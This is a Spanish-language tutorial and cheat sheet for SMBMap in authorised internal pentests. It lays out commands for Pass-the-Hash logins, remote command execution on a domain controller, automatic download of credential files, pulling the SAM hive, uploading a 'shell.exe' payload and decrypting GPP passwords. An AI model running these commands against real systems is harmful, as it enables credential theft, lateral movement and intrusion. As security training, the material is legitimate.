# 🗂️ SMBMap — Guía Completa de Enumeración SMB

## 🧠 Concepto clave

SMB (Server Message Block) es el protocolo de red de Windows para compartir ficheros, impresoras y comunicaciones entre procesos (named pipes). Es omnipresente en entornos corporativos y Active Directory: cualquier Windows moderno lo expone en el puerto `445/TCP`. La gestión incorrecta de permisos en shares, el uso de credenciales débiles o la existencia de sesiones nulas convierte SMB en uno de los vectores de enumeración más rentables de un pentest interno.

> [!info] **smbmap** 📄 [SMBMap — GitHub](https://github.com/ShawnDEvans/smbmap) Herramienta ofensiva especializada en enumeración de recursos compartidos SMB, creada por Shawn Evans. A diferencia de `smbclient`, smbmap expone directamente los **permisos** de cada share (READ/WRITE/NO ACCESS), permitiendo identificar misconfiguraciones críticas en segundos. Soporta autenticación nula, credenciales en texto claro, Pass-the-Hash y Kerberos. Incluida por defecto en Kali Linux (`sudo apt install smbmap`). Depende de Python 3 e Impacket internamente.

|Capacidad|Descripción|Cuándo usarla|
|---|---|---|
|Enumeración de shares|Lista todos los recursos SMB y sus permisos|Reconocimiento inicial, siempre|
|Sesión nula|Acceso sin credenciales|Primera comprobación sobre cualquier host con 445 abierto|
|Pass-the-Hash|Autenticación con hash NTLM sin crackear|Post-compromiso, movimiento lateral|
|Kerberos|Autenticación con ticket TGT/ccache|Entornos AD con NTLM deshabilitado|
|Listado recursivo|Explora directorios y ficheros de un share|Búsqueda de datos sensibles|
|Auto-download por patrón|Descarga automática de ficheros que coinciden con regex|Exfiltración dirigida|
|Búsqueda en contenido|Busca patrones dentro del contenido de ficheros|Localizar credenciales hardcoded (requiere admin)|
|Ejecución de comandos|RCE sobre el host remoto vía WMI o PSExec|Post-explotación|
|Upload/Download/Delete|Transferencia e interacción con el sistema de ficheros|Entrega de payloads, exfiltración|

---

## 📌 Puntos importantes

### Sintaxis general

```bash
smbmap [-h] (-H HOST | --host-file FILE) [opciones de autenticación] [opciones de acción]
```

Exactamente uno de `-H` o `--host-file` es obligatorio en toda invocación. El resto de parámetros son opcionales y se combinan según la acción deseada.

---

### Referencia completa de parámetros

#### Argumentos principales

|Parámetro|Valor|Descripción|
|---|---|---|
|`-H HOST`|IP o FQDN|Host objetivo. Exclusivo con `--host-file`|
|`--host-file FILE`|Ruta a fichero|Fichero con lista de hosts (IPs, FQDNs o rangos CIDR), uno por línea|
|`-u`, `--username`|USERNAME|Usuario para autenticación. Si se omite, se intenta sesión nula|
|`-p`, `--password`|PASSWORD|Contraseña en texto claro **o** hash NTLM en formato `LMHASH:NTHASH`|
|`--prompt`|—|Solicita la contraseña de forma interactiva (no queda en el historial de bash)|
|`-s SHARE`|Nombre del share|Share sobre el que operar. Por defecto `C$`|
|`-d DOMAIN`|Nombre de dominio|Dominio AD. Por defecto `WORKGROUP` (autenticación local)|
|`-P PORT`|Número de puerto|Puerto SMB. Por defecto `445`|
|`-v`, `--version`|—|Devuelve la versión del SO del host remoto|
|`--signing`|—|Comprueba si el host tiene SMB signing deshabilitado, habilitado o requerido|
|`--admin`|—|Solo informa de si el usuario tiene privilegios de administrador en el host|
|`--no-banner`|—|Suprime el banner ASCII al inicio del output|
|`--no-color`|—|Elimina los colores ANSI del output (útil al redirigir a fichero)|
|`--no-update`|—|Suprime el mensaje "Working on it..." durante la ejecución|
|`--timeout`|Segundos|Timeout del socket de escaneo de puertos. Por defecto `0.5` segundos|

#### Autenticación Kerberos

|Parámetro|Descripción|
|---|---|
|`-k`, `--kerberos`|Activa autenticación Kerberos en lugar de NTLM|
|`--no-pass`|Usa el fichero CCache en lugar de contraseña (requiere `export KRB5CCNAME=ruta.ccache`)|
|`--dc-ip IP or Host`|IP o FQDN del Domain Controller. Necesario para resolución Kerberos|

#### Ejecución de comandos

|Parámetro|Descripción|
|---|---|
|`-x COMMAND`|Ejecuta un comando en el host remoto y devuelve el output|
|`--mode CMDMODE`|Método de ejecución: `wmi` (por defecto) o `psexec`|

#### Búsqueda y enumeración de shares

|Parámetro|Descripción|
|---|---|
|`-L`|Lista todas las unidades de disco locales del host remoto. Requiere privilegios de administrador|
|`-r [PATH]`|Lista el contenido de un directorio (un nivel). Sin argumento lista la raíz de todos los shares|
|`-g FILE`|Guarda el output de `-r` en formato grep-friendly en un fichero|
|`--csv FILE`|Guarda el output en formato CSV|
|`--dir-only`|Lista solo directorios, omitiendo los ficheros|
|`--no-write-check`|Omite la comprobación de permisos de escritura (acelera el escaneo)|
|`-q`|Modo silencioso: solo muestra shares con acceso READ o WRITE, suprime el listado de ficheros durante búsquedas con `-A`|
|`--depth DEPTH`|Profundidad máxima de recursión al listar. Por defecto `1` (solo el nodo raíz)|
|`--exclude SHARE [SHARE ...]`|Excluye uno o más shares del listado y la búsqueda|
|`-A PATTERN`|Regex sobre nombres de fichero: descarga automáticamente cualquier fichero que coincida (requiere `-r`)|

#### Búsqueda en contenido de ficheros

|Parámetro|Descripción|
|---|---|
|`-F PATTERN`|Busca un patrón de texto **dentro** del contenido de los ficheros. Requiere privilegios de administrador y PowerShell en el host víctima|
|`--search-path PATH`|Ruta de inicio para la búsqueda con `-F`. Por defecto `C:\Users`|
|`--search-timeout TIMEOUT`|Timeout en segundos antes de cancelar la búsqueda de contenido. Por defecto `300` segundos|

#### Interacción con el sistema de ficheros

|Parámetro|Descripción|
|---|---|
|`--download PATH`|Descarga un fichero del host remoto al directorio local actual|
|`--upload SRC DST`|Sube un fichero local al host remoto|
|`--delete "PATH TO FILE"`|Elimina un fichero en el host remoto|
|`--skip`|Omite la confirmación interactiva al usar `--delete`|

---

### Permisos en el output: qué significan

Cuando smbmap lista shares, cada uno aparece con su nivel de acceso efectivo para las credenciales usadas. Leer este output correctamente es tan importante como saber lanzar el comando.

|Permiso mostrado|Significado|Implicación ofensiva|
|---|---|---|
|`READ ONLY`|Permisos de lectura sobre el share|Exfiltración de datos, búsqueda de credenciales, configuraciones|
|`READ, WRITE`|Lectura y escritura completas|Entrega de payloads, modificación de ficheros, posible RCE|
|`NO ACCESS`|Sin permisos con estas credenciales|Probar otras creds, otros vectores, o esperar escalada|
|`ADMIN!!!`|El usuario es administrador local del host|Control total, RCE garantizado, volcado de hashes|
|`C$` / `D$` accesible|Shares administrativas de unidades|Acceso completo al sistema de ficheros de esa unidad|
|`ADMIN$` accesible|Share administrativa de Windows|Indica privilegios de administrador local|
|`IPC$` con READ|Named pipes disponibles|Permite consultas RPC, enumeración adicional con otras herramientas|

---

### Autenticación: las tres modalidades

**Sesión nula** — Sin credenciales. Históricamente frecuente en Samba Linux mal configurado y en Windows XP/2003. En sistemas modernos con configuración correcta devolverá `NO ACCESS` en todos los shares o una lista vacía. Siempre es el primer intento ante un host desconocido porque no genera alertas de autenticación fallida.

**Credenciales en texto claro** — La modalidad más habitual post-explotación o cuando se dispone de credenciales capturadas (phishing, volcado, spraying). El parámetro `-d` determina si la autenticación se valida contra la SAM local (`WORKGROUP`) o contra el DC del dominio AD.

**Pass-the-Hash (PtH)** — En lugar de contraseña se pasa el hash NTLM directamente, sin necesidad de crackearlo. El formato es `LMHASH:NTHASH`. Si no se dispone del hash LM (habitual en sistemas modernos), se usa el valor vacío estándar `aad3b435b51404eeaad3b435b51404ee`. Esta técnica funciona porque el protocolo NTLM acepta el hash directamente en el proceso de autenticación de desafío-respuesta.

**Kerberos** — Modalidad avanzada para entornos donde NTLM está deshabilitado o monitoreado. Requiere un ticket TGT válido exportado como ccache y la variable de entorno `KRB5CCNAME` apuntando a él. Es la menos común en CTF pero habitual en auditorías reales de AD hardened.

> [!important] Diferencia crítica entre `-d WORKGROUP` y `-d DOMINIO` Si el usuario es de dominio y se omite `-d` (o se deja `WORKGROUP`), smbmap intentará autenticación local contra la SAM del host. El resultado puede ser `NO ACCESS` aunque las credenciales sean válidas en el dominio. Siempre especificar el dominio correcto cuando se trabaje con usuarios AD.

---

## 🛠️ Comandos / Herramientas — Referencia por parámetro con ejemplos

### `-H` — Host objetivo

El parámetro fundamental. Acepta una IPv4, IPv6 o FQDN. Es mutuamente exclusivo con `--host-file`.

> [!tip] Enumeración básica de un host por IP
> 
> ```bash
> smbmap -H 10.10.10.100
> ```
> 
> `-H` — IP del host objetivo. Sin credenciales adicionales, smbmap intenta sesión nula automáticamente.

---

### `--host-file` — Lista de hosts

Permite escalar la enumeración a subredes completas o listas de objetivos sin necesidad de scripts externos.

> [!tip] Enumeración masiva desde fichero de hosts
> 
> ```bash
> smbmap --host-file /opt/targets/smb-hosts.txt -u 'jdoe' -p 'Password123' -d 'CORP.LOCAL'
> ```
> 
> `--host-file` — Ruta al fichero. Acepta IPs (`10.10.10.5`), FQDNs (`dc01.corp.local`) y rangos CIDR (`10.10.10.0/24`) mezclados en el mismo fichero. `-u` / `-p` / `-d` — Credenciales aplicadas a todos los hosts del fichero.

---

### `-u` / `-p` — Credenciales en texto claro

> [!tip] Autenticación con usuario y contraseña — dominio local
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!'
> ```
> 
> `-u` — Nombre de usuario. Sin `-d`, se asume autenticación local contra la SAM del host. `-p` — Contraseña en texto claro.

> [!tip] Autenticación con usuario de dominio AD
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL'
> ```
> 
> `-d` — Nombre NetBIOS del dominio o FQDN. Indica al protocolo NTLM que valide contra el DC y no contra la SAM local. Crítico para obtener resultados correctos con cuentas de dominio.

---

### `-p LMHASH:NTHASH` — Pass-the-Hash

> [!tip] Autenticación PtH con hash NTLM completo
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
> ```
> 
> `-p` — En PtH, el campo contraseña recibe el hash en formato `LM:NT`. El valor `aad3b435b51404eeaad3b435b51404ee` es el hash LM vacío estándar (Windows Vista en adelante no almacena LM). El hash NT es el valor de 32 caracteres hexadecimales que realmente autentica.

> [!tip] PtH con usuario de dominio
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'svc_backup' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
>   -d 'CORP.LOCAL'
> ```
> 
> `-d` — Igual de necesario en PtH que con contraseña en texto claro. El hash se envía al DC para validación cuando se especifica dominio.

---

### `--prompt` — Contraseña interactiva

> [!tip] Solicitar contraseña sin que aparezca en el historial
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' --prompt
> ```
> 
> `--prompt` — smbmap solicita la contraseña de forma interactiva. Útil en entornos donde el historial de bash es auditado o cuando se trabaja en un terminal compartido. La contraseña no queda registrada en `.bash_history`.

---

### `-k` / `--no-pass` / `--dc-ip` — Autenticación Kerberos

> [!tip] Autenticación con ticket Kerberos desde ccache
> 
> ```bash
> export KRB5CCNAME='/tmp/admin.ccache'
> smbmap -H dc01.corp.local -u 'Administrator' -k --no-pass --dc-ip 10.10.10.1
> ```
> 
> `export KRB5CCNAME` — Variable de entorno que indica a Kerberos dónde está el fichero ccache con el ticket TGT o TGS. `-k` — Activa el modo Kerberos en lugar de NTLM. `--no-pass` — Indica que no hay contraseña: usar el ccache directamente. `--dc-ip` — IP o FQDN del DC para la resolución de tickets. Necesario cuando el DNS no resuelve correctamente o se trabaja fuera del dominio.

> [!important] Kerberos requiere resolución DNS correcta La autenticación Kerberos es sensible al nombre del host: el ticket se emite para un SPN específico. Si se usa la IP en `-H` en lugar del FQDN, la autenticación puede fallar aunque el ticket sea válido. Usar siempre el FQDN del host con `-k`, y asegurarse de que `/etc/hosts` o el DNS resuelven correctamente.

---

### `-v` / `--version` — Versión del SO remoto

> [!tip] Obtener la versión del sistema operativo del host
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -v
> ```
> 
> `-v` — Consulta y devuelve la cadena de versión del SO remoto a través del protocolo SMB. Útil para identificar sistemas sin parchear o para confirmar si el objetivo es vulnerable a exploits específicos (EternalBlue en Windows 7/2008R2, PrintNightmare en versiones sin el parche de julio 2021, etc.).

**Ejemplo de output:**

```
[+] 10.10.10.100:445 is running Windows 10.0 Build 17763 (name:WINLPE-WS01) (domain:CORP)
```

---

### `--signing` — Detección de SMB Signing

> [!tip] Comprobar si SMB Signing está deshabilitado
> 
> ```bash
> smbmap -H 10.10.10.100 --signing
> ```
> 
> `--signing` — Comprueba la configuración de firma SMB del host. Los tres estados posibles son: `disabled` (sin firma, vulnerable a relay attacks), `enabled` (firma disponible pero no requerida) y `required` (firma obligatoria, inmune a relay).

> [!tip] Comprobar signing en múltiples hosts
> 
> ```bash
> smbmap --host-file /opt/targets/hosts.txt --signing
> ```
> 
> `--host-file` — Combinado con `--signing`, identifica rápidamente todos los hosts de una red que no requieren firma SMB, candidatos directos para ataques de **SMB Relay** con Responder + ntlmrelayx.

---

### `--admin` — Comprobación rápida de privilegios

> [!tip] Verificar si el usuario es administrador local del host
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' --admin
> ```
> 
> `--admin` — Solo devuelve si el usuario tiene o no privilegios de administrador, sin listar shares ni contenido. Ideal para validar credenciales rápidamente contra múltiples hosts sin generar demasiado output.

**Output si el usuario ES admin:**

```
[+] 10.10.10.100:445 is running Windows 10.0 Build 17763 (name:WINLPE-WS01) (domain:CORP) (signing:False) (SMBv1:False)
[*] ADMIN!!! 10.10.10.100
```

---

### `--timeout` — Timeout de conexión

> [!tip] Aumentar el timeout para redes lentas o con latencia alta
> 
> ```bash
> smbmap --host-file /opt/targets/hosts.txt -u 'jdoe' -p 'Pass123' --timeout 3
> ```
> 
> `--timeout` — Segundos de espera para el socket de escaneo de puertos. El valor por defecto `0.5s` puede provocar falsos negativos en redes con latencia alta (VPN con muchos saltos, hosts remotos). Aumentar a `2`-`5` segundos en esos escenarios.

---

### `-L` — Listar unidades de disco locales

> [!tip] Listar todas las unidades del sistema remoto
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' -L
> ```
> 
> `-L` — Enumera las unidades de disco físicas y lógicas del host remoto (C:, D:, E:...). Requiere privilegios de administrador. Útil para identificar unidades secundarias que pueden contener bases de datos, backups o datos corporativos no expuestos en los shares principales.

---

### `-r` — Listado de directorio (un nivel)

> [!tip] Listar la raíz de todos los shares accesibles
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -r
> ```
> 
> `-r` — Sin argumento, lista el primer nivel de directorio de **todos** los shares a los que el usuario tiene acceso. Con argumento, lista el contenido de la ruta indicada dentro del share especificado.

> [!tip] Listar el contenido de una ruta específica dentro de un share
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -r 'Shared/Documentos'
> ```
> 
> `-r 'SHARE/ruta'` — La ruta usa `/` o `\` como separador. El primer componente es el nombre del share, el resto es la ruta dentro de él.

---

### `-r --depth` — Listado recursivo controlado

El flag `-r` sin `--depth` solo baja un nivel. Para explorar en profundidad se combina con `--depth`.

> [!tip] Listado recursivo con profundidad controlada
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -r 'Shared' --depth 4
> ```
> 
> `-r 'Shared'` — Share de inicio del recorrido. `--depth 4` — Desciende hasta 4 niveles de subdirectorios. Por defecto es `1` (solo la raíz). Aumentar con precaución en shares grandes.

> [!tip] Listado recursivo mostrando solo directorios
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -r 'Shared' --depth 5 --dir-only
> ```
> 
> `--dir-only` — Omite los ficheros del output, mostrando únicamente la estructura de directorios. Útil para un primer mapeo rápido de la jerarquía antes de bajar a buscar ficheros concretos.

---

### `--exclude` — Excluir shares del escaneo

> [!tip] Enumerar todos los shares excepto los administrativos ruidosos
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   -r --depth 3 --exclude ADMIN$ C$ IPC$
> ```
> 
> `--exclude` — Acepta uno o varios nombres de share separados por espacios. Los shares `ADMIN$`, `C$` e `IPC$` son shares por defecto de Windows: excluirlos centra la búsqueda en shares personalizados de la organización donde es más probable encontrar datos sensibles.

---

### `-q` — Modo silencioso

> [!tip] Output reducido: solo shares con acceso
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -r --depth 3 -q
> ```
> 
> `-q` — Suprime los shares con `NO ACCESS` del output y oculta el listado de ficheros cuando se usa con `-A`. Ideal para escaneos masivos donde solo interesa saber qué shares son accesibles sin ruido adicional.

---

### `-g` / `--csv` — Output a fichero

> [!tip] Guardar el listado de shares en formato grep-friendly
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -r 'Shared' -g /opt/output/shares_jdoe.txt
> ```
> 
> `-g FILE` — Guarda el output en un fichero de texto con formato de una entrada por línea, fácil de procesar con `grep`, `awk` o `cut`. Se usa siempre junto con `-r`.

> [!tip] Guardar resultados en CSV para análisis posterior
> 
> ```bash
> smbmap --host-file /opt/targets/hosts.txt -u 'jdoe' -p 'Password123!' --csv /opt/output/smb-audit.csv
> ```
> 
> `--csv FILE` — Genera un fichero CSV con el inventario de shares y permisos. Útil para documentar el alcance de un pentest o para importar los resultados a una hoja de cálculo o herramienta de reporting.

---

### `--no-write-check` — Acelerar escaneos masivos

> [!tip] Escaneo rápido omitiendo comprobación de escritura
> 
> ```bash
> smbmap --host-file /opt/targets/hosts.txt -u 'jdoe' -p 'Pass123' --no-write-check -q
> ```
> 
> `--no-write-check` — Smbmap normalmente intenta escribir un fichero temporal para verificar si tiene permisos de escritura. Este flag omite esa comprobación, reduciendo el tiempo de escaneo y el ruido generado. Úsarlo cuando solo interesa saber qué shares son legibles, no si son escribibles.

---

### `-A` — Auto-download por patrón de nombre de fichero

`-A` es una de las funcionalidades más potentes para exfiltración dirigida. Combina el listado recursivo con la descarga automática de cualquier fichero cuyo nombre coincida con una expresión regular.

> [!tip] Descargar automáticamente ficheros de configuración XML e INI
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   -r 'Shared' --depth 10 -A '.*\.(xml|ini|config|cfg)$'
> ```
> 
> `-r 'Shared'` — Share de inicio. `-A` requiere `-r` para funcionar. `--depth 10` — Profundidad de recursión. Usar un valor alto para no perder ficheros en subdirectorios profundos. `-A` — Regex case-insensitive aplicada sobre los nombres de fichero. Los ficheros que coincidan se descargan automáticamente al directorio de trabajo local.

> [!tip] Buscar credenciales por nombre de fichero en todos los shares
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   -r --depth 8 -A '(pass|cred|secret|key|token|login|auth|backup|shadow|ntds)' -q
> ```
> 
> `-r` — Sin argumento para cubrir todos los shares accesibles. `-A` — Patrón que cubre los nombres más frecuentes de ficheros con credenciales en entornos Windows. `-q` — Suprime el ruido del listado, mostrando solo los ficheros descargados.

> [!tip] Buscar GPP Credentials en SYSVOL
> 
> ```bash
> smbmap -H 10.10.10.1 -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL' \
>   -r 'SYSVOL' --depth 10 -A 'Groups\.xml$'
> ```
> 
> `-r 'SYSVOL'` — El share `SYSVOL` del DC contiene las Group Policy. Las GPP (Group Policy Preferences) antiguas almacenaban contraseñas en ficheros `Groups.xml` con cifrado AES-256 cuya clave fue publicada por Microsoft, haciendo el cifrado completamente reversible. `-A 'Groups\.xml$'` — Localiza específicamente ese fichero. Si se descarga, usar `gpp-decrypt` para recuperar la contraseña en texto claro.

---

### `-F` — Búsqueda en contenido de ficheros

A diferencia de `-A` (que busca por nombre), `-F` busca **dentro del contenido** de los ficheros. Requiere privilegios de administrador porque internamente ejecuta un comando PowerShell en el host víctima.

> [!tip] Buscar la cadena "password" dentro de ficheros en el host remoto
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' \
>   -F '[Pp]assword'
> ```
> 
> `-F` — Patrón regex buscado dentro del contenido de los ficheros. Por defecto busca en `C:\Users`. Requiere que PowerShell esté disponible en el host víctima y que el usuario tenga privilegios de administrador.

> [!tip] Búsqueda en contenido con ruta personalizada y timeout extendido
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' \
>   -F '(password|passwd|PWD|contrase)' \
>   --search-path 'C:\inetpub' \
>   --search-timeout 600
> ```
> 
> `-F` — Patrón de búsqueda en contenido. Acepta regex completa. `--search-path` — Cambia la ruta de inicio desde `C:\Users` a cualquier otra. Útil para buscar en directorios de aplicaciones web (`C:\inetpub`), bases de datos, o unidades secundarias. `--search-timeout` — Segundos antes de cancelar la búsqueda. Aumentar para directorios grandes. Por defecto `300s`.

> [!important] `-F` es muy ruidoso y requiere admin La búsqueda de contenido ejecuta comandos PowerShell en el host remoto a través del mecanismo de ejecución de smbmap. Esto genera eventos en los logs del sistema objetivo y es altamente detectable por EDR y SIEM. Usar solo cuando sea imprescindible, con autorización explícita del cliente, y documentarlo como acción intrusiva en el informe.

---

### `-x` / `--mode` — Ejecución remota de comandos

> [!tip] Ejecutar un comando en el host remoto (modo WMI por defecto)
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' \
>   -x 'whoami /all'
> ```
> 
> `-x` — Comando a ejecutar en el sistema remoto. El output se devuelve en la terminal local. `--mode` — No especificado: usa `wmi` por defecto. WMI es más silencioso que PSExec porque no crea un servicio temporal visible.

> [!tip] Ejecutar comando usando PSExec como método de ejecución
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' \
>   -x 'net localgroup administrators' --mode psexec
> ```
> 
> `--mode psexec` — Usa el mecanismo estilo PSExec: crea un servicio temporal en el sistema remoto, ejecuta el comando y lo elimina. Más compatible que WMI en algunos entornos pero genera más artefactos en los logs de Windows (Event ID 7045: nuevo servicio instalado).

> [!tip] RCE con Pass-the-Hash para listar administradores de dominio
> 
> ```bash
> smbmap -H 10.10.10.1 -u 'Administrator' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' \
>   -d 'CORP.LOCAL' \
>   -x 'net group "Domain Admins" /domain'
> ```
> 
> `-x` — Ejecuta el comando directamente en el DC usando PtH. Devuelve la lista de Domain Admins sin necesidad de crackear el hash.

> [!important] Ejecución de comandos — Técnica muy ruidosa Cualquier ejecución remota con smbmap genera artefactos forenses en el sistema objetivo: entradas en el log de seguridad (4688: proceso creado), en el log del sistema (7045 si usa psexec), y tráfico SMB anómalo detectable por el SIEM. Coordinar siempre con el cliente antes de usar `-x`. En pentests red team, preferir técnicas de ejecución más sigilosas como `impacket-wmiexec` o beacons C2 en memoria.

---

### `--download` — Descarga de ficheros

> [!tip] Descargar un fichero específico del host remoto
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   --download 'Shared\Configuracion\web.config'
> ```
> 
> `--download PATH` — Ruta completa al fichero en el formato `SHARE\ruta\fichero`. Usa backslash (`\`) como separador. El fichero se descarga al directorio de trabajo actual del atacante.

> [!tip] Descargar fichero desde share administrativo C$
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' \
>   --download 'C$\Windows\System32\config\SAM'
> ```
> 
> `'C$\Windows\System32\config\SAM'` — La base de datos SAM contiene los hashes de contraseñas de los usuarios locales. Solo accesible con privilegios de administrador y cuando el sistema no tiene la SAM bloqueada (en sistemas en ejecución, Windows bloquea este fichero; usar `impacket-secretsdump` para extraer los hashes en caliente).

---

### `--upload` — Subida de ficheros

> [!tip] Subir un payload ejecutable a un share con permisos de escritura
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   --upload '/opt/payloads/shell.exe' 'Shared\Temp\shell.exe'
> ```
> 
> `--upload SRC DST` — Primer argumento: ruta local (Linux) del fichero a subir. Segundo argumento: ruta de destino en el host remoto en formato `SHARE\ruta\fichero`. Requiere permisos `WRITE` sobre el share o directorio destino.

> [!important] Subida de ficheros en entornos de cliente Subir ejecutables a shares de red modifica el entorno del cliente y puede desencadenar alertas del EDR si el fichero es analizado. Documentar siempre la ruta exacta donde se sube el fichero para facilitar la limpieza posterior. En auditorías con escaso impacto acordado, preferir payloads fileless en memoria en lugar de escribir ejecutables en disco.

---

### `--delete` / `--skip` — Eliminación de ficheros

> [!tip] Eliminar un fichero remoto con confirmación
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' \
>   --delete 'Shared\Temp\shell.exe'
> ```
> 
> `--delete "PATH TO FILE"` — Ruta al fichero a eliminar en el host remoto. Por defecto smbmap pide confirmación interactiva antes de proceder.

> [!tip] Eliminar fichero sin confirmación interactiva (limpieza automatizada)
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'Administrator' -p 'Password123!' \
>   --delete 'Shared\Temp\shell.exe' --skip
> ```
> 
> `--skip` — Omite el prompt de confirmación. Útil en scripts de limpieza post-explotación automatizados donde no hay interacción humana.

---

### `--no-banner` / `--no-color` / `--no-update` — Control del output

> [!tip] Output limpio para redirigir a fichero o pipeline
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   --no-banner --no-color --no-update -r 'Shared' \
>   | tee /opt/output/smb-enum-$(date +%F).txt
> ```
> 
> `--no-banner` — Elimina el arte ASCII del encabezado. `--no-color` — Elimina los códigos de color ANSI, imprescindible al redirigir a fichero de texto (evita caracteres de escape ilegibles). `--no-update` — Suprime el mensaje "Working on it..." que aparece mientras smbmap trabaja. `tee` — Muestra el output en pantalla y lo guarda en fichero simultáneamente.

---

## 📋 Flujos de trabajo completos

### Flujo 1 — Reconocimiento inicial sin credenciales

El punto de partida ante cualquier host con el puerto `445/TCP` abierto es verificar si acepta sesión nula y qué información expone sin autenticación.

**Paso 1 — Verificar acceso anónimo y listar shares**

> [!tip] Enumeración con sesión nula
> 
> ```bash
> smbmap -H 10.10.10.100
> ```
> 
> `-H` — Sin `-u` ni `-p`, smbmap intenta sesión nula automáticamente. Si hay shares accesibles sin autenticación, aparecerán con `READ ONLY` o `READ, WRITE`.

**Paso 2 — Comprobar la versión del SO y el estado de SMB Signing**

> [!tip] Obtener OS version y estado de firma SMB
> 
> ```bash
> smbmap -H 10.10.10.100 -v --signing
> ```
> 
> `-v` — Versión del SO: permite identificar si el sistema está sin parchear. `--signing` — Estado de firma: si es `disabled`, el host es candidato a SMB Relay.

**Paso 3 — Si hay shares accesibles, explorar su contenido**

> [!tip] Listado recursivo de share anónimo
> 
> ```bash
> smbmap -H 10.10.10.100 -r 'Public' --depth 5
> ```
> 
> `-r 'Public'` — Explora el share accesible anónimamente hasta 5 niveles de profundidad.

---

### Flujo 2 — Enumeración post-compromiso con credenciales de dominio

Una vez obtenidas credenciales válidas, la secuencia estándar para mapear el terreno SMB de un entorno AD.

**Paso 1 — Mapear todos los shares y sus permisos**

> [!tip] Inventario completo de shares con credenciales de dominio
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL' \
>   --no-banner --no-color
> ```
> 
> `-d 'CORP.LOCAL'` — Dominio AD. Fundamental para que los permisos se resuelvan correctamente.

**Paso 2 — Explorar shares con acceso READ o WRITE**

> [!tip] Listado recursivo excluyendo shares administrativos
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL' \
>   -r --depth 4 --exclude ADMIN$ IPC$ -q
> ```
> 
> `--exclude ADMIN$ IPC$` — Centra la búsqueda en shares de datos y evita ruido de shares de sistema. `-q` — Solo muestra shares con acceso efectivo.

**Paso 3 — Buscar ficheros sensibles por nombre**

> [!tip] Auto-download de ficheros con patrones de credenciales
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL' \
>   -r --depth 8 \
>   -A '(password|passwd|cred|secret|config|backup|\.kdbx|web\.config|appsettings)' \
>   -q --no-banner --no-color
> ```
> 
> `-A` — Regex amplia que cubre los patrones de nombre más frecuentes en ficheros con credenciales. Los ficheros `.kdbx` son bases de datos KeePass, `web.config` y `appsettings.json` suelen contener connection strings con credenciales de base de datos.

**Paso 4 — Descargar ficheros de interés identificados manualmente**

> [!tip] Descarga directa de fichero localizado
> 
> ```bash
> smbmap -H 10.10.10.100 -u 'jdoe' -p 'Password123!' \
>   --download 'Shared\IT\scripts\deploy.ps1'
> ```
> 
> `--download` — Descarga el script al directorio actual para análisis offline. Revisar con `cat` o `grep -i pass` para localizar credenciales hardcoded.

---

### Flujo 3 — GPP Credentials en SYSVOL (DC)

Las Group Policy Preferences antiguas almacenaban contraseñas cifradas con AES-256 en ficheros XML dentro de SYSVOL. La clave de cifrado fue publicada por Microsoft en 2012 (MS14-025), haciendo el cifrado completamente reversible. Es un hallazgo frecuente en dominios AD heredados.

**Paso 1 — Buscar Groups.xml en SYSVOL**

> [!tip] Localizar y descargar GPP credentials en SYSVOL
> 
> ```bash
> smbmap -H 10.10.10.1 -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL' \
>   -r 'SYSVOL' --depth 10 -A 'Groups\.xml$'
> ```
> 
> `-r 'SYSVOL'` — Share del DC que contiene todas las Group Policy del dominio. Accesible para cualquier usuario autenticado del dominio. `-A 'Groups\.xml$'` — Descarga automáticamente cualquier `Groups.xml` encontrado en la estructura de GPO.

**Paso 2 — Descifrar el campo `cpassword`**

```bash
gpp-decrypt 'AzVJmXh28ogNS8c10JE3EuKEkC0='
```

